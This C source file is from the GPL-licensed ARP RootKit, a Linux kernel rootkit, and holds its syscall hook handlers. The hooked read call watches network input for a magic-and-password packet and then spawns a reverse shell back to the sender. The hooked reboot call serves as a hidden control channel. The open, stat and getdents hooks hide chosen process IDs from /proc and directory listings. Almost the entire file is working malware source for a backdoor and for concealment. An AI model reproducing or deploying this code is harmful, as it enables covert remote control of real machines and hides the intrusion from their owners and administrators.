/***
 *      _  __  __     __
 *     /_) )_) )_)    )_) _   _  _)_ )_/ o _)_
 *    / / / \ /      / \ (_) (_) (_ /  ) ( (_
 *
 *//* License
 *
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 *//* Notes
 *
 * Here the hook handlers and functions used on it.
 * This file is part of RK's Kernel.
 */

#include <linux/kmod.h>
#include "hooks.h"
#include "kernel.h"
#include "arprk-conf.h"
#include "rshell.h"
#include "ctl.h"

asmlinkage int my_recvfrom64(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len) {
	int ret = 0;

	//SYSCALL64(__NR_write, 1, "hello from hook!\n", 17, 0, 0, 0);
	//ret = SYSCALL64(__NR_recvfrom, fd, ubuf, size, flags, addr, addr_len);
	return ret;
}

asmlinkage int my_recvfrom32(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len) {
    int ret = 0;

    SYSCALL64(__NR_write, 1, "hello from hook!\n", 17, 0, 0, 0);
    //ret = SYSCALL32(__NR_recvfrom, fd, ubuf, size, flags, addr, addr_len);
    return ret;
}

asmlinkage int my_read64(int fd, void *buf, size_t len) {
	char *ubuf = NULL;
	int nread = 0, *addr_len = NULL, ret = 0;
	struct rshell_req *req = NULL;
	struct sockaddr_in *addr = NULL;

	ubuf = alloc_umem(4096);
	addr = (struct sockaddr_in *) (ubuf + 2048);
	addr_len = (int *) (ubuf + 2048 + sizeof(struct sockaddr_in));
	if (ubuf != MAP_FAILED) {
		// MSG_KEEP is the key to keep the data in the queue.
		// then we can compare and serve it without doing a lot of work.
		nread = SYSCALL64(__NR_recvfrom, fd, ubuf, 2048, MSG_PEEK, NULL, NULL);
		if (nread == sizeof(struct rshell_req)) {
			req = (struct rshell_req *) ubuf;
			if (f_memcmp(req->magic, RSHELL_MAGIC, sizeof(RSHELL_MAGIC)) == 0 && f_memcmp(req->password, RSHELL_PASSWORD, sizeof(RSHELL_PASSWORD)) == 0) {
				//f_printk("GOT RSHELL REQUEST\n");
				// if client didn't specify a connect-back IP, use the one from sys_recvmsg().
				if (!req->reverse.sin_addr.s_addr) {
					*addr_len = sizeof(struct sockaddr_in);
					ret = SYSCALL64(__NR_getpeername, fd, addr, addr_len, 0, 0, 0);
					//f_printk("ret = %d, *addr_len = %d, addr = %ld\n", ret, *addr_len, addr->sin_addr.s_addr);
					if (!ret && *addr_len == sizeof(struct sockaddr_in)) {
						req->reverse.sin_addr.s_addr = addr->sin_addr.s_addr;
						launch_shell(req->reverse);
					}
				} else {
					launch_shell(req->reverse);
				}
				// empty buffer
				nread = SYSCALL64(__NR_recvfrom, fd, ubuf, sizeof(struct rshell_req), 0, 0, 0);
				if (nread == sizeof(struct rshell_req)) {
					free_umem(ubuf, 4096);
					return my_read64(fd, buf, len);
				}
				free_umem(ubuf, 4096);
			}
		}
		free_umem(ubuf, 4096);
	}

	return SYSCALL64(__NR_read, fd, buf, len, 0, 0, 0);
}

asmlinkage int my_read32(int fd, void *buf, size_t len) {
	return 0;
}

int launch_shell(struct sockaddr_in dest) {
	char *envp[] = { NULL }, *argv[] = { RSHELL_PATH, "255.255.255.255", "65535", NULL };
	int ret = 0;
	
	snprintf(argv[1], 16, "%pI4", &dest.sin_addr.s_addr);
	snprintf(argv[2], 6, "%hu", ntohs(dest.sin_port));
	//f_printk("addr = %s, port = %s\n", argv[1], argv[2]);
	ret = f_call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	return ret;
}

asmlinkage int my_reboot64(int magic1, int magic2, unsigned int cmd, void *arg) {
	if (magic1 == (int)ARPRK_CTL_MAGIC1 && magic2 == (int)ARPRK_CTL_MAGIC2 && cmd == (unsigned int)ARPRK_CTL_MAGIC3) {
		// at this point I think we're 99% we want to call the rootkit's control routine.
		return arprk_ctl(arg);
	} else {
		return SYSCALL64(__NR_reboot, magic1, magic2, cmd, arg, 0, 0);
	}
}

int get_fd_path(int fd, char *path) {
	char *ubuf = NULL;
	long ret = 0;
	pid_t pid = 0;

	ubuf = alloc_umem(MAX_PATH);
	ret = pid = SYSCALL64(__NR_getpid, 0, 0, 0, 0, 0, 0);
	if (pid) {
		snprintf(ubuf, MAX_PATH, "/proc/%d/fd/%d", pid, fd);
		ret = SYSCALL64(__NR_readlink, ubuf, path, MAX_PATH, 0, 0, 0);
		//if (ret >= 0) {
			//f_printk("fd %d ret %d ubuf %s path %s\n", fd, ret, ubuf, path);
		//}
	}
	free_umem(ubuf, MAX_PATH);
	return ret;
}

bool check_pid_in_path(int dfd, const char *path) {
    char *ubuf = NULL, *ubuf2 = NULL, *new_path = NULL;
    const char *p = NULL;
    size_t len = 0;
    pid_t pid = 0;
	unsigned long long ull = 0;
	off_t off = 0;
	struct stat *stat = NULL;
	long ret = 0;

	ubuf = alloc_umem(MAX_PATH);
    if (ubuf) {
		if (dfd != -1) {
			ret = get_fd_path(dfd, ubuf);
			if (ret >= 0) {
				//f_printk("path of %d is %s\n", dfd, ubuf);
				off = f_strlen(ubuf);
				ubuf[off++] = '/';
				ubuf[off] = 0;
			}
		}
		f_memcpy(ubuf + off, path, f_strlen(path));
		new_path = alloc_umem(MAX_PATH);
		f_memcpy(new_path, ubuf, f_strlen(ubuf));
		f_printk("fd = %d, ubuf = %s\n", dfd, ubuf);
        f_strreplace(ubuf, '/', 0);
        p = ubuf;
		while (!p[len] && len < f_strlen(new_path) && len < 4096) {
			len++;
		}
		p += len;
        while ((len = f_strlen(p))) {
            f_kstrtoull(p, 10, &ull);
			pid = (pid_t) ull;
			//f_printk("checking pid %d - %s - %d - %s\n", pid, p, len, new_path);
            if (pid && pid_list_find(pid)) {
				// now we have a numeric entry which is in hidden pid list
				// but, to be sure it's a proc element, first we check if it's a directory.
				// so, we compose the path until the pid: <before_elements>/pid
				off = (long)memmem(new_path, f_strlen(new_path), p, len) - (long)new_path;
				off += len;
				if (off > 0) {
					ubuf2 = alloc_umem(MAX_PATH);
					if (ubuf2) {
						f_memcpy(ubuf2, new_path, off);
						ubuf2[off] = 0;
						stat = alloc_umem(sizeof(struct stat));
						if (stat) {
							ret = SYSCALL64(__NR_stat, ubuf2, stat, 0, 0, 0, 0);
							f_printk("new_path %s ubuf2 %s ret %d stat->st_mode %d stat %lx\n", new_path, ubuf2, ret, stat->st_mode, stat);
							if (!ret && S_ISDIR(stat->st_mode)) {
								//f_printk("ubuf2 %s\n", ubuf2);
								free_umem(new_path, MAX_PATH);
								free_umem(stat, sizeof(struct stat));
								free_umem(ubuf2, MAX_PATH);
								free_umem(ubuf, MAX_PATH);
								return true;
							}
							free_umem(stat, sizeof(struct stat));
						}
						free_umem(ubuf2, MAX_PATH);
					}
				}
            }
            p += len + 1;
        }
		free_umem(new_path, MAX_PATH);
        free_umem(ubuf, MAX_PATH);
    }
	return false;
}

asmlinkage int my_open64(const char *path, int flags, umode_t mode) {
	if (check_pid_in_path(-1, path)) {
		return -ENOENT;
	}
	return SYSCALL64(__NR_open, path, flags, mode, 0, 0, 0);
}

asmlinkage int my_openat64(int dfd, const char *path, int flags, umode_t mode) {
	if (check_pid_in_path(dfd, path)) {
		return -ENOENT;
	}
	return SYSCALL64(__NR_openat, dfd, path, flags, mode, 0, 0);
}

long my_getdents(long nr, unsigned int fd, void __user *dirent, unsigned int count) {
	long nread = 0;
	off_t off = 0, off_new = 0;
	void *ubuf = NULL, *ubuf_new = NULL;
	struct linux_dirent *e = NULL;

	ubuf = alloc_umem(count);
	ubuf_new = alloc_umem(count);
	if (ubuf) {
		nread = SYSCALL64(__NR_getdents, fd, ubuf, count, 0, 0, 0);
		for (off = 0, off_new = 0, e = ubuf; off < nread; off += e->d_reclen, e = ubuf + off) {
			//f_printk("nread %d %d %d\n", nread, off, e->d_reclen);
			if (!check_pid_in_path(fd, e->d_name)) {
				//f_printk("gentdents %s\n", e->d_name);
				f_memcpy(ubuf_new + off_new, ubuf + off, e->d_reclen);
				off_new += e->d_reclen;
			}
		}
		f_memcpy(dirent, ubuf_new, off_new);
		free_umem(ubuf, count);
		free_umem(ubuf_new, count);
		return off_new;
	}
	return SYSCALL64(nr, fd, dirent, count, 0, 0, 0);
}

asmlinkage long my_getdents64(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
	return my_getdents(__NR_getdents, fd, dirent, count);
}

asmlinkage long my_getdents6464(unsigned int fd, struct linux_dirent64 __user *dirent,	unsigned int count) {
	return my_getdents(__NR_getdents64, fd, dirent, count);
}

asmlinkage long my_stat64(const char __user *filename, struct stat __user *statbuf) {
	if (check_pid_in_path(-1, filename)) {
		return -ENOENT;
	}
	return SYSCALL64(__NR_stat, filename, statbuf, 0, 0, 0, 0);
}

asmlinkage long my_lstat64(const char __user * filename, struct stat __user *statbuf) {
    if (check_pid_in_path(-1, filename)) {
        return -ENOENT;
    }
    return SYSCALL64(__NR_lstat, filename, statbuf, 0, 0, 0, 0);
}
/*
asmlinkage long my_newstat64(const char __user *filename, struct stat __user *statbuf) {
    if (check_pid_in_path(filename)) {
        return -ENOENT;
    }
    return SYSCALL64(__NR_newstat, filename, statbuf, 0, 0, 0, 0);
}

asmlinkage long my_newlstat64(const char __user *filename, struct stat __user *statbuf) {
    if (check_pid_in_path(filename)) {
        return -ENOENT;
    }
    return SYSCALL64(__NR_newlstat, filename, statbuf, 0, 0, 0, 0);
}
*/
asmlinkage long my_newfstatat64(int dfd, const char __user *filename, struct stat __user *statbuf, int flag) {
    if (check_pid_in_path(-1, filename)) {
        return -ENOENT;
    }
    return SYSCALL64(__NR_newfstatat, dfd, filename, statbuf, flag, 0, 0);
}

/*
asmlinkage long my_stat6464(const char __user *filename, struct stat64 __user *statbuf) {
    if (check_pid_in_path(filename)) {
        return -ENOENT;
    }
    return SYSCALL64(__NR_stat64, filename, statbuf, 0, 0, 0, 0);
}

asmlinkage long my_lstat6464(const char __user *filename, struct stat64 __user *statbuf) {
    if (check_pid_in_path(filename)) {
        return -ENOENT;
    }
    return SYSCALL64(__NR_lstat64, filename, statbuf, 0, 0, 0, 0);
}

asmlinkage long my_fstatat6464(int dfd, const char __user *filename, struct stat __user *statbuf, int flag) {
    if (check_pid_in_path(filename)) {
        return -ENOENT;
    }
    return SYSCALL64(__NR_fstatat64, dfd, filename, statbuf, flag, 0, 0);
}
*/

/* allocate memory in user-space process context */
void *alloc_umem(size_t len) {
	return (void *) SYSCALL64(__NR_mmap, 0, len, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
}

long free_umem(void *ptr, size_t len) {
	return SYSCALL64(__NR_munmap, ptr, len, 0, 0, 0, 0);
}

int arprk_ctl(struct arprk_ctl *ctl) {
	switch (ctl->cmd) {
		case ARPRK_CTLCMD_HIDE_PID:
			f_printk("HIDE PID request for %d\n", ctl->pid);
			hide_pid(ctl->pid);
			break;
		case ARPRK_CTLCMD_UNHIDE_PID:
			unhide_pid(ctl->pid);
			break;
		default:
			f_printk("unknown CTL CMD\n");
			break;
	}

	return 0;
}

int hide_pid(pid_t nr) {
    struct pid *pid;

    pid = f_find_vpid(nr);
    if (pid) {
        if (pid_list_find(nr)) {
            perr("PID %d already hidden.\n", nr);
        } else {
            pid_list_push(nr);
            pinfo("PID %d is hidden.\n", nr);
            return 0;
        }
    } else {
        perr("PID %d not found.\n", nr);
    }

    return -1;
}

int unhide_pid(pid_t nr) {
    if (pid_list_pop(nr) == nr) {
		pinfo("PID %d unhidden.\n", nr);

        return 0;
    } else {
        perr("PID %d is not hidden.\n", nr);
    }

    return -1;
}
